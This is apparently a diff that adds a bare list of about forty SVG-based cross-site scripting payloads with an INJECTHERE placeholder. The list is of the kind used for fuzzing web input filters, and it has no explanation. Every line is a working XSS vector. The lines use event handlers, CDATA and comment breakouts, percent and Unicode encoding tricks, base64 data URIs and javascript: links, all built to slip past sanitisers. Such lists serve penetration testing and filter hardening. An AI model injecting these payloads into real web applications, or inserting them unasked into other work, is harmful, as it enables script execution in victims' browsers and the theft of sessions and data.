@@ -1,0 +1,41 @@
+<svgonload=alert(INJECTHERE)>
+<svg/onload=alert(INJECTHERE)>
+<svg onload=alert(INJECTHERE)//
+<svg/onload=alert(INJECTHERE)>
+<svg id=alert(INJECTHERE) onload=eval(id)>
+"><svg/onload=alert(INJECTHERE)>
+"><svg/onload=alert(INJECTHERE)
+<svg xmlns="http://www.w3.org/2000/svg" onload="alert(INJECTHERE)"/>
+<svg><desc><![CDATA[</desc><script>alert(INJECTHERE)</script>]]></svg>
+<svg><foreignObject><![CDATA[</foreignObject><script>alert(INJECTHERE)</script>]]></svg>
+<svg><title><![CDATA[</title><script>alert(INJECTHERE)</script>]]></svg>
+-->'"/></sCript><svG x=">" onload=(co\u006efirm)``>
+<svg%0Ao%00nload=%09((pro\u006dpt))()//
+<svg><set onbegin=alert(INJECTHERE)>
+<svg><set end=1 onend=alert(INJECTHERE)>
+<svg><a><rect width=99% height=99% /><animate attributeName=hrefto=javascript:alert(INJECTHERE)>
+<svg><a><rect width=99% height=99% /><animate attributeName=hrefvalues=javascript:alert(INJECTHERE)>
+<svg><a><rect width=99% height=99% /><animate attributeName=href to=0from=javascript:alert(INJECTHERE)>
+<svg><use xlink:href=data:image/svg%2Bxml;base64,PHN2ZyBpZD0ieCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxuczp4bGluaz0iaHR0cDovL3d3dy53My5vcmcvMTk5OS94bGluayI%2BPGVtYmVkIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hodG1sIiBzcmM9ImphdmFzY3JpcHQ6YWxlcnQoMSkiLz48L3N2Zz4=%23x>
+<svg/on<script><script>load=alert(INJECTHERE)//</script>
+%u003Csvg onload=alert(INJECTHERE)>
+%u3008svg onload=alert(INJECTHERE)>
+%uFF1Csvg onload=alert(INJECTHERE)>
+"><svg/onload=alert(INJECTHERE)>"@x.y
+"'>confirm&lpar;1)</Script><Svg><Script/1='
+<!--><svg onload=alert(INJECTHERE)-->
+<svg id=<img/src/onerror&#61alert(INJECTHERE)&gt; onload=head.innerHTML=id>
+<svg id=<img/src/onerror&#61alert(INJECTHERE)&gt; onload=body.outerHTML=id>
+veris-->group<svg/onload=alert(INJECTHERE)//
+<svg><style>{font-family&colon;'<iframe/onload=confirm(INJECTHERE)>'
+<sVg><scRipt %00>alert&lpar;1&rpar; {Opera}
+<iframe/src="data:text/html,<svg &#111;&#110;load=alert(INJECTHERE)>">
+&#34;&#62;<svg><style>{-o-link-source&colon;'<body/onload=confirm(INJECTHERE)>'
+</font>/<svg><style>{src&#x3A;'<style/onload=this.onload=confirm(INJECTHERE)>'</font>/</style>
+</svg>''<svg><script 'AQuickBrownFoxJumpsOverTheLazyDog'>alert&#x28;INJECTHERE&#x29; {Opera}
+<svg><script ?>alert(INJECTHERE)
+<svg contentScriptType=text/vbs><script>MsgBox
+<a href="data:text/html;base64_,<svg/onload=\u0061&#x6C;&#101%72t(INJECTHERE)>">X</a
+<svg><script>//&NewLine;confirm(INJECTHERE);</script </svg>
+<svg contentScriptType=text/vbs><script>MsgBox+INJECTHERE
+<svg><script>//&NewLine;confirm(INJECTHERE);</script </svg>
